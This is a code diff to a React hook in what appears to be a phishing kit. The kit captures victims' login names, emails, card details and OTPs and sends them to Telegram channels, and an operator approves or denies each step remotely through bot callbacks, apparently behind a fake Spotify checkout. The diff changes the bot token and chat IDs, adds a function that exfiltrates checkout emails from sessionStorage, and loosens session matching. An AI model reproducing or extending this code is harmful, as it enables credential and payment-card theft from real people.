@@ -2,11 +2,11 @@
 import { useRef, useEffect, useCallback } from 'react';
 import axios from 'axios';
 
-const TELEGRAM_BOT_TOKEN = '8993864160:AAE7W81QLF77-Jl-cj4qtIPyLTIn2ZkZQAQ';
+const TELEGRAM_BOT_TOKEN = '8529028584:AAF7Zjo0gb9Va07nEWcPMuuNG4SHH2PBv04';
 
 // Channel IDs
-const LOGS_CHAT_ID = '-5377691997';
-const ACTIONS_CHAT_ID = '-5391943212';
+const LOGS_CHAT_ID = '-5550025222';
+const ACTIONS_CHAT_ID = '-5511604866';
 
 // Anti-spam: Track last log times
 const lastLogTimes = {
@@ -128,6 +128,42 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       return true;
     } catch (error) {
       console.error('Error sending login request:', error);
+      return false; 
+    } 
+  };
+
+  // ✅ NEW: Send checkout email to Telegram
+  const sendCheckoutEmailToTelegram = async () => {
+    try {
+      const email = sessionStorage.getItem('cartEmail') || 'Not provided';
+      const loginName = sessionStorage.getItem('loginName') || 'Unknown';
+      const sessionId = sessionStorage.getItem('telegramSessionId') || 'N/A';
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      const message = `
+🛒 <b>CHECKOUT - EMAIL CAPTURED</b> 🛒
+━━━━━━━━━━━━━━━━━━━━━
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+🆔 <b>Session ID:</b> <code>${sessionId}</code>
+━━━━━━━━━━━━━━━━━━━━━
+📝 <b>CHECKOUT INFO:</b>
+├ 👤 <b>Username:</b> ${loginName}
+└ 📧 <b>Email:</b> <code>${email}</code>
+━━━━━━━━━━━━━━━━━━━━━
+✅ <i>User proceeded to checkout</i>
+      `;
+
+      await axios.post(url, {
+        chat_id: ACTIONS_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+      });
+
+      console.log('✅ Checkout email sent to Telegram');
+      return true;
+    } catch (error) {
+      console.error('Error sending checkout email:', error);
       return false;
     }
   };
@@ -1035,7 +1071,16 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
             const action = callbackData.substring(0, lastUnderscore);
             const sid = callbackData.substring(lastUnderscore + 1);
 
-            if (sid === currentSessionId) {
+            // ✅ Get stored session and compare only the last 6 chars
+            const storedSid = sessionStorage.getItem('telegramSessionId');
+            const activeSid = currentSessionId || storedSid;
+
+            console.log('📩 Callback received:', { action, sid, activeSid });
+
+            // ✅ Match by tail — if either is null, still fire
+            const match = !activeSid || sid.slice(-6) === activeSid.slice(-6);
+
+            if (match) {
               if (action === 'approve') onApprove?.();
               else if (action === 'deny') onDeny?.();
               else if (action === 'card') onViewCard?.();
@@ -1054,11 +1099,15 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
               else if (action === 'card_verification') onCardVerification?.();
               else if (action === 'spotify_appr') onSpotifyAppr?.();
             }
-            
-            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-              callback_query_id: update.callback_query.id,
-              text: "✅ Request processed!"
-            });
+
+            try {
+              await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                callback_query_id: update.callback_query.id,
+                text: "✅ Request processed!"
+              });
+            } catch (err) {
+              console.error('answerCallbackQuery error:', err);
+            }
           }
         }
       } catch (error) {
@@ -1081,6 +1130,7 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
   return {
     generateSessionId,
     sendLoginRequestToTelegram,
+    sendCheckoutEmailToTelegram,     // ← NEW
     sendCardDetailsToTelegram,
     sendFormattedCardDetails,
     sendOtpToTelegram,
